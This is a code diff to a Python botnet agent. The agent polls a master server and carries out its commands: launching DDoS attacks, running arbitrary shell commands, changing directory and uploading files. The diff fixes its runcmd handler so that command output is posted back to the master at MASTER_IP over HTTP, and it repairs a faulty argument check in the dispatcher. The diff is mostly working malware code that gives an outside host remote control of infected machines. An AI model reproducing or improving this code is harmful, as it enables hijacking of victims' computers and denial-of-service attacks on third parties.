@@ -1,5 +1,6 @@
 # from flask import Flask
 from subprocess import Popen, PIPE
+import subprocess
 import requests
 import time
 import shutil
@@ -56,7 +57,7 @@ def cd(path):
 
 def send_result():
     global result
-    # print(result)
+    print("In result")
     while 1:
         try:
             requests.post("http://" + MASTER_IP + ":" + MASTER_PORT + "/result", json=json.dumps(result))
@@ -81,15 +82,18 @@ def upload_file(file_name):
             fin.close()
 
 def runcmd(cmd):
+    global result
     """ Chạy một shell command và trả về output"""
     try:
+        print("In run cmd")
         proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         out, err = proc.communicate()
-        result = (out + err)
-        self.send_result()
+        result = str(out + err)
+        print(result)
     except Exception as exc:
-        result = traceback.format_exc()
-        self.send_result()
+        print("In exceptio")
+        print(str(exc))
+        result = str(exc)
 
 steps = {
     "DDoS": (get_script, launchDDoS),
@@ -98,7 +102,7 @@ steps = {
     "cd" : (cd, send_result),
     "pwd" : (pwd, send_result),
     "upload" : (upload_file, ),
-    "runcmd" : (runcmd, )
+    "runcmd" : (runcmd, send_result)
 }
 
 
@@ -109,8 +113,6 @@ def run():
             command = parse_ret_val(command)
             if str(command[0]) not in steps:
                 continue
-            elif str(command[0]) == "update_agent":
-                os.run()
             else:
                 print("command is:", command[0])
                 print(command[1])
@@ -118,7 +120,7 @@ def run():
                 for step in steps[command[0]]:
                     args = inspect.getargspec(step)[0]
                     assert(isinstance(args, list))
-                    if 'path' in args or 'file_name' or 'cmd' in args:
+                    if 'path' in args or 'file_name' in args or 'cmd' in args:
                         step(command[1])
                     # elif 'result' in args:
                     #     step()
